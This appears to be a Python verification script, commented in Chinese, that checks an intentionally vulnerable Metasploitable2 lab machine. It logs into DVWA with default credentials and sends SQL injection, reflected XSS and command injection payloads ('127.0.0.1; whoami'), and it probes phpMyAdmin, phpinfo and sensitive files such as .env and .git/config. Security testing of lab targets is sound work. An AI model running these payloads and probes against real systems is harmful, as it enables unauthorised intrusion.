"""手动验证 Metasploitable2 的关键漏洞"""
import sys
sys.path.insert(0, r"C:\Users\HZR\.qclaw\workspace-agent-b7ed571b\wvs-v18")

import asyncio
import aiohttp

TARGET = "http://192.168.18.131"

async def verify():
    async with aiohttp.ClientSession() as session:
        # 1. DVWA SQL Injection
        print("[1] DVWA SQL Injection")
        dvwa_url = TARGET + "/dvwa/vulnerabilities/sqli/"
        try:
            # DVWA 默认凭据: admin/password
            login_data = aiohttp.FormData()
            login_data.add_field("username", "admin")
            login_data.add_field("password", "password")
            login_data.add_field("Login", "Login")
            async with session.post(TARGET + "/dvwa/login.php", data=login_data) as resp:
                print(f"    Login: {resp.status}")
            # 测试 SQLi
            sqli_payloads = ["1' OR '1'='1", "1' UNION SELECT NULL--", "1 AND 1=1"]
            for payload in sqli_payloads:
                params = {"id": payload}
                async with session.get(dvwa_url, params=params) as resp:
                    text = await resp.text()
                    if "admin" in text.lower() or "sintax" in text.lower() or len(text) < 100:
                        print(f"    [SQLi] Payload: {payload} -> {resp.status}")
        except Exception as e:
            print(f"    DVWA error: {e}")

        # 2. DVWA XSS
        print("\n[2] DVWA XSS (Reflected)")
        xss_url = TARGET + "/dvwa/vulnerabilities/xss_r/"
        payload = "<script>alert(document.domain)</script>"
        async with session.get(xss_url, params={"name": payload}) as resp:
            text = await resp.text()
            if payload in text:
                print(f"    [XSS REFLECTED!] Payload in response")
            else:
                print(f"    [FILTERED] Payload not reflected")

        # 3. Mutillidae XSS
        print("\n[3] Mutillidae XSS")
        pages_to_test = [
            ("/?page=add-to-your-blog.php", "add_to_your_blog"),
            ("/?page=dns-lookup.php", "dns_lookup_hostname"),
        ]
        for page, param in pages_to_test:
            url = TARGET + "/mutillidae" + page
            payload = "<img src=x onerror=alert(1)>"
            data = {param: payload}
            try:
                async with session.post(url, data=data) as resp:
                    text = await resp.text()
                    if payload in text:
                        print(f"    [XSS] {page} - REFLECTED!")
                    elif payload.replace("<img", "&lt;img") in text:
                        print(f"    [ENCODED] {page} - HTML encoded")
                    else:
                        print(f"    [FILTERED] {page}")
            except Exception as e:
                print(f"    [ERROR] {page}: {e}")

        # 4. PhpMyAdmin
        print("\n[4] PhpMyAdmin")
        try:
            async with session.get(TARGET + "/phpmyadmin/", timeout=aiohttp.ClientTimeout(total=5)) as resp:
                if resp.status == 200:
                    text = await resp.text()
                    print(f"    [FOUND] PhpMyAdmin accessible!")
                    if "login" in text.lower():
                        print(f"    [INFO] Login required - default creds: root/root")
        except Exception as e:
            print(f"    [ERROR] PhpMyAdmin: {e}")

        # 5. phpinfo()
        print("\n[5] PHP Info")
        try:
            async with session.get(TARGET + "/phpinfo.php", timeout=aiohttp.ClientTimeout(total=5)) as resp:
                text = await resp.text()
                if "phpinfo" in text.lower() and len(text) > 1000:
                    print(f"    [FOUND] phpinfo.php exposed! ({len(text)} bytes)")
        except Exception as e:
            print(f"    [ERROR] phpinfo: {e}")

        # 6. 敏感文件
        print("\n[6] Sensitive Files")
        sensitive_paths = ["/.git/config", "/.env", "/config.php", "/.htaccess", "/admin/"]
        for path in sensitive_paths:
            try:
                async with session.get(TARGET + path, timeout=aiohttp.ClientTimeout(total=3)) as resp:
                    if resp.status == 200:
                        print(f"    [FOUND] {path}")
            except:
                pass

        # 7. TWiki XSS
        print("\n[7] TWiki XSS")
        try:
            async with session.get(TARGET + "/twiki/bin/view/Main/", params={"topic": "<script>alert(1)</script>"}, timeout=aiohttp.ClientTimeout(total=5)) as resp:
                text = await resp.text()
                if "<script>alert(1)</script>" in text:
                    print(f"    [XSS REFLECTED!] TWiki topic parameter")
                else:
                    print(f"    [FILTERED] TWiki")
        except Exception as e:
            print(f"    [ERROR] TWiki: {e}")

        # 8. CMDi - Mutillidae DNS
        print("\n[8] CMDi - Mutillidae DNS Lookup")
        try:
            params = {"dns_lookup_hostname": "127.0.0.1"}
            async with session.get(TARGET + "/mutillidae/index.php?page=dns-lookup.php", params=params) as resp:
                text = await resp.text()
                print(f"    [INFO] DNS lookup response len: {len(text)}")
            # CMDi test
            params = {"dns_lookup_hostname": "127.0.0.1; whoami"}
            async with session.get(TARGET + "/mutillidae/index.php?page=dns-lookup.php", params=params) as resp:
                text = await resp.text()
                if "www-data" in text or "root" in text or "user" in text:
                    print(f"    [CMDi] Command injection - whoami in response!")
                else:
                    print(f"    [CHECK] CMDi - response len: {len(text)}")
        except Exception as e:
            print(f"    [ERROR] CMDi: {e}")

asyncio.run(verify())
